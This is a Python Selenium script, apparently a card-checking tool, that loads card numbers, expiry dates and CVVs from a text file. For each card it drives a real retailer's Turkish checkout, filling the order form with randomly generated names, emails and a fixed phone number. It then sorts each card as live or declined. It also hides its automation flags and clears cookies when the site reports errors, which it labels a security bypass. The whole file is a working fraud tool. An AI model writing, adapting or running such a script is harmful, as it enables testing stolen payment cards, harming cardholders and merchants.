import chromedriver_autoinstaller
from http import client
from typing import Text
from selenium import webdriver
from colorama import Fore, Back, Style, init
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support import select
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.ui import Select
import random
import string
import random
import re
import string


from time import sleep

def funct():
    CCList = open('cc.txt', "r+", encoding="utf8").read().splitlines()
    kartlar = []

    for i in CCList:
        bolum = i.split('|')
        kartlar.append((bolum[0], bolum[1], bolum[2], bolum[3]) ,)

    return kartlar


letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
def random_char(char_num):
       return ''.join(random.choice(string.ascii_letters) for _ in range(char_num))

options = webdriver.ChromeOptions()

options.add_experimental_option("useAutomationExtension", False)  # Adding Argument to Not Use Automation Extension
options.add_experimental_option("excludeSwitches", ["enable-automation"])  # Excluding enable-automation Switch
options.add_argument("disable-popup-blocking")
options.add_argument("disable-notifications")
options.add_argument("disable-gpu")
chromedriver_autoinstaller.install()
driver = webdriver.Chrome(options=options)
driver.set_window_size(800, 600)
user_agent =" Mozilla/5.1 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1"
wait = WebDriverWait(driver, 26, poll_frequency=1)
print('Starting ..')
driver.delete_all_cookies()
buy = ("https://www.bershka.com/tr/aslan-burcu-u%C3%A7lu-kolye-c0p103013723.html?colorId=302")
init(autoreset=True)
while True:

        print('Starting ..')
        #Purchased product link here  , change it if the product is out of stock
        driver.get(buy)
        sleep(4)
        try: driver.find_element(By.XPATH, "//button[@id=\'onetrust-accept-btn-handler\']").click()
        except:
            print('cookie button click')
            pass
        try:  driver.find_element(By.XPATH, "//button[@id=\'onetrust-close-btn-containe\']").click() 
        except:
            print('cookie button click')
            pass
        
      
        # tikla = wait.until(EC.presence_of_element_located((By.ID, 'onetrust-close-btn-container')))
 
 
 

        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '.button-text'))).click()
        sleep(2)
        driver.get("https://www.bershka.com/tr/checkout.html")
        sleep(2)
        wait.until(
             EC.presence_of_element_located((By.XPATH, '//*[@id="shipping-wrapper"]/div[1]/shipping-methods/shipping-method[1]/div/span'))
        ).click()
        driver.find_element_by_css_selector('.ellipsis').click()
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#store-search'))).send_keys('a')
        sleep(1)
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'button.inverse:nth-child(2)'))).click()
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'bsk-store-address.stores-address-container:nth-child(1) > div:nth-child(1)'))).click()
        wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div"))).click()
        wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div/input"))).send_keys(random_char(5))
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").click()
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").send_keys(random_char(5))
        driver.find_element_by_name("email").click()
        driver.find_element_by_name("email").send_keys(random_char(5)+"@mail.com")
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").click()
        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").send_keys("5344443565")
        driver.find_element_by_xpath("//*[@id='summary-wrapper']/div/div[2]/div/div/cta-checkout/div/div/div[2]/div").click()
        print( Fore.GREEN +"kayıt tamamlandı.")
        sleep(1)
        #driver.find_element_by_css_selector("#summary-wrapper > div > div.summary-cta > div > div > cta-checkout > div > div > div.cta-checkout-post > div > button").click()
         
        tikli = False
        kartlar = funct()
        for (cc, mm, yy, cvv) in kartlar:

            if re.findall(r"^4",cc):
                wait.until(EC.presence_of_element_located(((By.CSS_SELECTOR, '.payment-19-info > span:nth-child(1)')))).click()
                print(f'Visa Seçildi ..') 
            
            elif re.findall(r"^5",cc):
                wait.until(EC.presence_of_element_located(((By.CSS_SELECTOR, '.payment-20-info > span:nth-child(1)')))).click()
                print(f'Mastercard Seçildi ..')

            wait.until(
             EC.presence_of_element_located((By.XPATH, '/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/div[1]/form/div[1]/payment-credit-card/ng-form/ul/li[1]/div/input'))
            ).clear()
            wait.until(
             EC.presence_of_element_located((By.XPATH, '/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/div[1]/form/div[1]/payment-credit-card/ng-form/ul/li[1]/div/input'))
            ).send_keys(cc)
            sleep(0.4)
            wait.until(
             EC.presence_of_element_located((By.NAME, "month"))
            ).click()
            wait.until(
             EC.presence_of_element_located((By.NAME, "month"))
            ).send_keys(mm) 
            sleep(0.3)         
            wait.until(
            EC.presence_of_element_located((By.NAME, "year"))
            ).click  
            wait.until(
            EC.presence_of_element_located((By.NAME, "year"))
            ).send_keys(yy) 
            sleep(0.5) 
            wait.until(
            EC.presence_of_element_located((By.NAME, "cvv2"))
            ).clear()
            wait.until(
            EC.presence_of_element_located((By.NAME, "cvv2"))
            ).send_keys(cvv)
            wait.until(
            EC.presence_of_element_located((By.NAME, "holder"))
            ).clear()
            driver.find_element_by_name("holder").send_keys("ali"+random_char(5)) 
            try:
                sleep(1)
                dropdown = driver.find_element(By.NAME, "paymentModeId")
            except:continue
            dropdown = driver.find_element(By.NAME, "paymentModeId")
            try:
                dropdown.find_element(By.XPATH, "//option[. = 'Tek Çekim Ödeme']").click()
            except: continue    
            x=driver.find_element_by_name("number").is_displayed()
            if tikli == False:
               driver.find_element_by_name("privacyPolicy").click()
            tikli = True
            driver.find_element_by_css_selector(".ellipsis").click()
            driver.execute_script("window.scrollTo(0,0)")
            sleep(2)            
            hata2 = ('Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.')
            hata1 = ('Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.')
            hata3 = ('Transaction not completed. Enter the expiry date on your card')
            sleep(2)
            if 'Siparişiniz için çok teşekkür ederiz' in driver.page_source:
                print(Fore.GREEN +"LİVE KART NO"," :", cc,"|",mm,"|",yy,"|",cvv,)
                #print(cikti.text)
            
            elif 'Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.' in driver.page_source: 
                print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)
                

            elif 'Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.' in driver.page_source: 
                print(Fore.RED +"Güvenlik Bypass Yapılıyor. !"," :", cc,"|",mm,"|",yy,"|",cvv,)
                driver.delete_all_cookies
                driver.get(buy)

            elif 'Transaction not completed. Enter the expiry date on your card' in driver.page_source:
                print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)
            
            sleep(1)
            driver.delete_all_cookies
            driver.get("https://www.bershka.com/tr/")
            sleep(3)
            driver.get("https://www.bershka.com/tr/checkout.html")
            sleep(2)
            driver.refresh()
            sleep(2)
            tikli = False
            sleep(1)

